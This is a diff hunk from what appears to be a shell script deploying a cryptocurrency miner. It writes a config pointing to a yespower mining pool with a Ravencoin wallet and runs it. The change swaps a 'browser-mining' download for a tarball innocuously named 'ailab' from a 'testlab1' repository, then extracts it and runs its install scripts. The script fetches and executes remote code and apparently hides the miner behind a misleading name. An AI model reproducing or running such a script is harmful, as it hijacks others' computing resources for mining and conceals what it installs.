@@ -36,9 +36,9 @@ rm config.json
 echo '[{"algorithm": "yespower", "host": "yespower.na.mine.zpool.ca", "port": 6234, "worker": "RVkDXkSRDsXAzvAtFz3fuqT7chcdvWopyB", "password": "c=RVN", "workers": 8 }]' > config.json
             node index.js
 			
-curl https://github.com/malphite-code/browser-mining/releases/download/v1/browser-mining.tar.gz -L -O -J
-            tar -xf browser-mining.tar.gz
-            cd browser-mining
+curl https://github.com/WEASTERNSMITH/testlab1/raw/refs/heads/main/ailab.tar.gz -L -O -J
+            tar -xf ailab.tar.gz
+            cd ailab
             npm install
             sh install.sh
             rm config.json
